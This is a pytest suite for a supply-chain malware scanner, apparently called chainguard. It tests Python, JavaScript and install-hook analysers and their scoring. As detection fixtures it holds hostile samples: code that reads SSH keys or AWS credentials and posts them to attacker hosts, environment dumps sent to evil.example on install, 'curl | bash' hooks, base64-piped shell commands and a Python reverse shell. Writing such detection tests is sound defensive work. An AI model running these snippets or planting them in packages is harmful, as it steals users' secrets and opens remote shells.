"""Static analysis engine tests.

Every test here runs offline against inline source. That is deliberate: the
detection logic must be verifiable without a network, both so the suite is fast
and so a reviewer can run it on a machine with no internet access.

Several tests encode specific false positives that were found by running the
engine against real packages (BUILD_LOG D-022, D-040). They exist to stop those
regressions returning, and each names the package that motivated it.
"""

from __future__ import annotations

import pytest
from chainguard.analysis.engine import analyse_source_text
from chainguard.analysis.indicators import (
    looks_like_encoded_payload,
    shannon_entropy,
)
from chainguard.analysis.js_ast import analyse_javascript_file
from chainguard.analysis.python_ast import analyse_python_file
from chainguard.analysis.shell import analyse_install_command
from chainguard.config import get_settings
from chainguard.models.package import Ecosystem, PackageMetadata


def codes(analysis) -> set[str]:
    return {s.code for s in analysis.signals}


# --------------------------------------------------------------------------- #
# Python analyser
# --------------------------------------------------------------------------- #


class TestPythonAnalyser:
    def test_detects_credential_path_and_network(self):
        source = """
import urllib.request

def steal():
    with open("/home/user/.ssh/id_rsa") as f:
        key = f.read()
    urllib.request.urlopen("http://45.9.148.99/collect", data=key.encode())
"""
        result = analyse_python_file("steal.py", source)
        assert "SENSITIVE_PATH_ACCESS" in codes(result)
        assert "NETWORK_ACCESS" in codes(result)
        assert "HARDCODED_IP_ENDPOINT" in codes(result)
        assert result.has_sensitive_path and result.has_network

    def test_resolves_import_aliases(self):
        """`import subprocess as sp` then `sp.run` is invisible to text search."""
        source = "import subprocess as sp\nsp.run('whoami', shell=True)\n"
        result = analyse_python_file("a.py", source)
        assert "PROCESS_SPAWN" in codes(result)
        assert "SHELL_TRUE" in codes(result)

    def test_decode_then_exec_is_distinct_from_plain_eval(self):
        packed = analyse_python_file(
            "p.py", "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"
        )
        assert "DECODE_THEN_EXEC" in codes(packed)

        plain = analyse_python_file("q.py", "exec('print(1)')\n")
        assert "DYNAMIC_EVAL" in codes(plain)
        assert "DECODE_THEN_EXEC" not in codes(plain)

    def test_comments_and_docstrings_do_not_trigger_detection(self):
        """The reason for parsing rather than pattern-matching."""
        source = '''
"""This module does not call eval() or os.system() anywhere."""
# eval("danger")
def safe():
    return "we avoid subprocess.run and ~/.ssh/id_rsa entirely"
'''
        result = analyse_python_file("doc.py", source)
        assert "DYNAMIC_EVAL" not in codes(result)
        assert "PROCESS_SPAWN" not in codes(result)

    def test_unparseable_source_degrades_instead_of_raising(self):
        result = analyse_python_file("broken.py", "def (((( this is not python")
        assert result.parse_failed is True
        assert isinstance(result.signals, list)

    def test_setup_py_flags_risky_calls_only(self):
        """Regression: pyyaml — ordinary setup.py logic must not be flagged."""
        ordinary = """
import os
from setuptools import setup

here = os.path.dirname(__file__)
with open(os.path.join(here, "README.md")) as f:
    long_description = f.read()

version = {}
exec(open("mypkg/version.py").read(), version)

try:
    from mypkg import build_ext
except ImportError:
    build_ext = None

setup(name="mypkg", version=version["__version__"], long_description=long_description)
"""
        result = analyse_python_file("setup.py", ordinary)
        # exec() is a genuine dynamic-execution signal and is still reported...
        assert "DYNAMIC_EVAL" in codes(result)
        # ...but ordinary module-level structure is not treated as a side effect.
        side_effects = [s for s in result.signals if s.code == "SETUP_PY_SIDE_EFFECTS"]
        assert len(side_effects) <= 1

    def test_setup_py_flags_network_at_module_level(self):
        hostile = """
import urllib.request
from setuptools import setup

urllib.request.urlopen("http://evil.example/beacon")

setup(name="bad", version="1.0")
"""
        result = analyse_python_file("setup.py", hostile)
        assert "SETUP_PY_SIDE_EFFECTS" in codes(result)
        assert result.runs_at_install is True

    def test_reverse_shell_requires_actual_wiring(self):
        """Regression: lxml — network + subprocess + exec is not a reverse shell."""
        build_script = """
import subprocess, urllib.request
subprocess.run(["pkg-config", "--cflags", "libxml2"])
urllib.request.urlopen("https://example.com/schema.xsd")
exec(open("version.py").read())
"""
        assert "REVERSE_SHELL_PATTERN" not in codes(
            analyse_python_file("setup.py", build_script)
        )

        real = """
import socket, subprocess, os
s = socket.socket()
s.connect(("10.0.0.1", 4444))
os.dup2(s.fileno(), 0)
subprocess.call(["/bin/sh", "-i"])
"""
        assert "REVERSE_SHELL_PATTERN" in codes(analyse_python_file("shell.py", real))


# --------------------------------------------------------------------------- #
# JavaScript analyser
# --------------------------------------------------------------------------- #


class TestJavaScriptAnalyser:
    def test_resolves_require_bindings(self):
        source = """
const cp = require("child_process");
cp.exec("cat /etc/passwd");
"""
        result = analyse_javascript_file("i.js", source)
        assert "PROCESS_SPAWN" in codes(result)
        assert "SHELL_TRUE" in codes(result)

    def test_resolves_destructured_requires(self):
        source = 'const { exec } = require("child_process");\nexec("whoami");\n'
        result = analyse_javascript_file("i.js", source)
        assert "PROCESS_SPAWN" in codes(result)

    def test_named_env_read_is_not_bulk_harvest(self):
        """Regression: express, debug, axios, webpack.

        The AST walk visits `process.env` as a sub-expression of every
        `process.env.FOO`, which previously counted named reads as
        whole-environment reads.
        """
        named = analyse_javascript_file(
            "a.js", "const port = process.env.PORT || 3000;\nmodule.exports = port;\n"
        )
        assert "ENV_ACCESS" in codes(named)
        assert "ENV_BULK_HARVEST" not in codes(named)

    def test_whole_env_read_is_bulk_harvest(self):
        bulk = analyse_javascript_file(
            "b.js",
            'const https = require("https");\n'
            'https.request("https://evil.example", {method:"POST"}).end(JSON.stringify(process.env));\n',
        )
        assert "ENV_BULK_HARVEST" in codes(bulk)

    def test_suspicious_endpoint_detected(self):
        source = 'fetch("https://discord.com/api/webhooks/123/abc", {method:"POST"});'
        assert "SUSPICIOUS_ENDPOINT" in codes(analyse_javascript_file("x.js", source))

    def test_modern_syntax_degrades_to_text_scan(self):
        """esprima cannot parse this, but findings must not vanish silently."""
        source = 'const x = a?.b ?? c; const p = "~/.aws/credentials";'
        result = analyse_javascript_file("m.js", source)
        assert result.parse_failed is True
        assert "SENSITIVE_PATH_ACCESS" in codes(result)

    def test_single_fromcharcode_is_not_obfuscation(self):
        """Regression: axios, webpack — parsers use this legitimately."""
        one = analyse_javascript_file("a.js", "const c = String.fromCharCode(65);")
        assert "CHARCODE_OBFUSCATION" not in codes(one)

        many = analyse_javascript_file(
            "b.js", "\n".join(f"const c{i} = String.fromCharCode({i});" for i in range(8))
        )
        assert "CHARCODE_OBFUSCATION" in codes(many)


# --------------------------------------------------------------------------- #
# Install hooks
# --------------------------------------------------------------------------- #


class TestInstallHooks:
    def test_curl_pipe_bash_is_critical(self):
        signals = analyse_install_command("postinstall", "curl -s http://evil.sh | bash")
        found = {s.code for s in signals}
        assert "INSTALL_HOOK_SHELL_PIPE" in found
        assert "INSTALL_HOOK_NETWORK" in found

    @pytest.mark.parametrize(
        "command",
        ["node-gyp rebuild", "npm run build", "tsc", "husky install",
         "node ./scripts/postinstall.js", "prebuild-install || node-gyp rebuild"],
    )
    def test_ordinary_build_hooks_raise_only_the_presence_signal(self, command):
        found = {s.code for s in analyse_install_command("postinstall", command)}
        assert found == {"INSTALL_HOOK_PRESENT"}, f"{command} raised {found}"

    def test_base64_hook_flagged_as_obfuscated(self):
        found = {
            s.code
            for s in analyse_install_command(
                "preinstall", "echo ZXZpbA== | base64 -d | sh"
            )
        }
        assert "INSTALL_HOOK_OBFUSCATED" in found


# --------------------------------------------------------------------------- #
# Composite signals and end-to-end scoring
# --------------------------------------------------------------------------- #


class TestComposites:
    def test_exfiltration_requires_both_halves(self):
        result = analyse_source_text(
            "evil", "1.0.0", Ecosystem.PYPI,
            {
                "evil/core.py": (
                    "import os, socket, urllib.request\n"
                    "data = open(os.path.expanduser('~/.aws/credentials')).read()\n"
                    "urllib.request.urlopen('http://1.2.3.4/x', data=data.encode())\n"
                )
            },
        )
        assert "EXFIL_CREDENTIALS_TO_NETWORK" in {s.code for s in result.signals}
        # Assert against the configured decision threshold rather than a magic
        # number: what matters is that the sample lands on the malicious side of
        # the boundary the system actually uses.
        assert result.rules_score > get_settings().malicious_threshold

    def test_install_exfil_needs_collection_and_egress(self):
        """Regression: pillow, lxml, flask, urllib3, requests.

        exec() in setup.py is a version-loading idiom, not exfiltration.
        """
        benign = analyse_source_text(
            "lib", "1.0.0", Ecosystem.PYPI,
            {"setup.py": "from setuptools import setup\nexec(open('v.py').read())\nsetup(name='lib')\n"},
        )
        assert "EXFIL_ON_INSTALL" not in {s.code for s in benign.signals}

        hostile = analyse_source_text(
            "bad", "1.0.0", Ecosystem.PYPI,
            {
                "setup.py": (
                    "import os, socket, urllib.request\n"
                    "from setuptools import setup\n"
                    "urllib.request.urlopen('http://evil.example/?h=' + socket.gethostname()"
                    " + str(dict(os.environ)))\n"
                    "setup(name='bad')\n"
                )
            },
        )
        assert "EXFIL_ON_INSTALL" in {s.code for s in hostile.signals}

    def test_benign_library_scores_low(self):
        result = analyse_source_text(
            "tidy", "1.0.0", Ecosystem.PYPI,
            {
                "tidy/__init__.py": (
                    "import json\n"
                    "def load(path):\n"
                    "    with open(path) as f:\n"
                    "        return json.load(f)\n"
                )
            },
            PackageMetadata(
                name="tidy", version="1.0.0", ecosystem=Ecosystem.PYPI,
                description="A tidy helper", version_count=14,
                repository_url="https://github.com/x/tidy", maintainer_count=3,
            ),
        )
        assert result.rules_score < 0.2

    def test_typosquat_detected_end_to_end(self):
        result = analyse_source_text(
            "reqeusts", "1.0.0", Ecosystem.PYPI, {"reqeusts/__init__.py": "x = 1\n"}
        )
        assert result.typosquat_target == "requests"
        assert "TYPOSQUAT_NEAR_MISS" in {s.code for s in result.signals}


# --------------------------------------------------------------------------- #
# Entropy heuristics
# --------------------------------------------------------------------------- #


class TestEncodedPayloadHeuristic:
    def test_prose_is_not_a_payload(self):
        prose = (
            "This function reads the configuration file from disk and returns a "
            "dictionary of settings. It raises a ValueError when the file cannot "
            "be parsed as valid configuration data for the application."
        )
        assert looks_like_encoded_payload(prose) is False

    def test_url_is_not_a_payload(self):
        url = "https://example.com/" + "a1b2c3d4/" * 30
        assert looks_like_encoded_payload(url) is False

    def test_base64_blob_is_a_payload(self):
        import base64
        blob = base64.b64encode(bytes(range(256)) * 3).decode()
        assert looks_like_encoded_payload(blob) is True

    def test_entropy_ordering(self):
        assert shannon_entropy("aaaaaaaaaa") < shannon_entropy("abcdefghij")
